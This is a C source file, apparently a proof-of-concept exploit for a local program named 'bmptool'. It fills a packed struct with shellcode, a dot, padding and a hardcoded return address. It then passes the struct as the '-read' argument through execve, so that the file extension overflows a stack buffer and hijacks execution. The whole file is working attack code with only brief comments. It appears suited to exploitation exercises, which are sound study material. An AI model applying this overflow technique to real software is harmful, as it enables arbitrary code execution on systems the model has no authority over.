#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = {
#include "stack-shellcode.h"
};

int main(void)
{
  struct _overflow {

    char shellcode[24];
    unsigned char dot;  /* the dot before the file extension */  
    char buf[48];       /* buffer that we overflow */
    uint32_t ret;
    unsigned char nul;  /* terminate string */

  } __attribute__((packed)) overflow;

  memset(&overflow, 'A', sizeof(overflow));

  /* a dot is needed as it is only the file extension that is copied to the stack */
  overflow.dot = '.';

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.shellcode, shellcode, sizeof(shellcode));

  overflow.ret = 0x08050d70;

  /* terminate the string */
  overflow.nul = '\0';

  /* create argv */
  char *argv[] = { "./bmptool", "-read", (char *)&overflow, NULL };

  /* execute exploit */
  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
